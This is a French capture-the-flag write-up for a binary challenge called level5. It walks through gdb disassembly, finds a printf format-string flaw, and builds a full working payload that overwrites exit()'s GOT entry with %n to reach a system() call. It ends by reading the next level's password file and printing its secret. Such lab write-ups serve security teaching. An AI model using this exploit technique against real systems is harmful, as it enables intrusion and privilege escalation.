#level5

$./level5
test
test

Level5 attend un input et ensuite l'affiche.

Regardons un peu plus en détail.

$ gdb level5

> disas main
> Dump of assembler code for function main:
> 0x08048504 <+0>: push %ebp
> 0x08048505 <+1>: mov %esp,%ebp
> 0x08048507 <+3>: and $0xfffffff0,%esp
> 0x0804850a <+6>: call 0x80484c2 <n>
> 0x0804850f <+11>: leave
> 0x08048510 <+12>: ret
> End of assembler dump.

On voit la fonction n(), allons la voir en détail.

> disas n
> Dump of assembler code for function n:
> 0x080484c2 <+0>: push %ebp
> 0x080484c3 <+1>: mov %esp,%ebp
> 0x080484c5 <+3>: sub $0x218,%esp
> 0x080484cb <+9>: mov 0x8049848,%eax
> 0x080484d0 <+14>: mov %eax,0x8(%esp)
> 0x080484d4 <+18>: movl $0x200,0x4(%esp)
> 0x080484dc <+26>: lea -0x208(%ebp),%eax
> 0x080484e2 <+32>: mov %eax,(%esp)
> 0x080484e5 <+35>: call 0x80483a0 <fgets@plt>
> 0x080484ea <+40>: lea -0x208(%ebp),%eax
> 0x080484f0 <+46>: mov %eax,(%esp)
> 0x080484f3 <+49>: call 0x8048380 <printf@plt>
> 0x080484f8 <+54>: movl $0x1,(%esp)
> 0x080484ff <+61>: call 0x80483d0 <exit@plt>
> End of assembler dump.

On voit une vulnaribilité sur printf.

Regardons s'il y a d'autres fonctions dans le programme.

> info functions
> All defined functions:

Non-debugging symbols:
0x08048334 \_init
0x08048380 printf
0x08048380 printf@plt
0x08048390 \_exit
0x08048390 \_exit@plt
0x080483a0 fgets
0x080483a0 fgets@plt
0x080483b0 system
0x080483b0 system@plt
0x080483c0 **gmon_start**
0x080483c0 **gmon_start**@plt
0x080483d0 exit
0x080483d0 exit@plt
0x080483e0 **libc_start_main
0x080483e0 **libc_start_main@plt
0x080483f0 \_start
0x08048420 **do_global_dtors_aux
0x08048480 frame_dummy
0x080484a4 o
0x080484c2 n
0x08048504 main
0x08048520 **libc_csu_init
0x08048590 **libc_csu_fini
0x08048592 **i686.get_pc_thunk.bx
0x080485a0 \_\_do_global_ctors_aux
0x080485cc \_fini

On voit la fonction o(), allons la voir en détail.

> disas o
> Dump of assembler code for function o:
> 0x080484a4 <+0>: push %ebp
> 0x080484a5 <+1>: mov %esp,%ebp
> 0x080484a7 <+3>: sub $0x18,%esp
> 0x080484aa <+6>: movl $0x80485f0,(%esp)
> 0x080484b1 <+13>: call 0x80483b0 <system@plt>
> 0x080484b6 <+18>: movl $0x1,(%esp)
> 0x080484bd <+25>: call 0x8048390 <_exit@plt>
> End of assembler dump.

Parfait nous avons juste à faire un appel à la fonction o.

Mais comment ? Car dans la fonction n(), on fait un exit(1) et on quitte le programme.

On va donc essayer de changer l'adresse de la fonction exit() pour qu'elle pointe vers o().

On obtient l'adresse de exit() en regardant le GTO (Global Offset Table).

$ objdump -R level5

level5: file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET TYPE VALUE
08049814 R_386_GLOB_DAT **gmon_start**
08049848 R_386_COPY stdin
08049824 R_386_JUMP_SLOT printf
08049828 R_386_JUMP_SLOT \_exit
0804982c R_386_JUMP_SLOT fgets
08049830 R_386_JUMP_SLOT system
08049834 R_386_JUMP_SLOT **gmon_start**
08049838 R_386_JUMP_SLOT exit
0804983c R_386_JUMP_SLOT \_\_libc_start_main

L'adresse de exit() est 0x08049838.

On va afficher la memoire jusqu'au exit.

$ python -c 'print "AAAA" + "%x "*8' | ./level5
AAAA200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520 25207825

Donc l'adresse d'exit est en 4eme position.

Maintenant changons l'adresse de exit() pour qu'elle pointe vers o() avec le modifieur %n.

Il nous faut le nombre de byte à ecrire, donc (0x080484a4 - 4) en decimal pour les 4 bytes de l'adresse d'exit.

$ (python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"'; cat -) | ./level5

cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
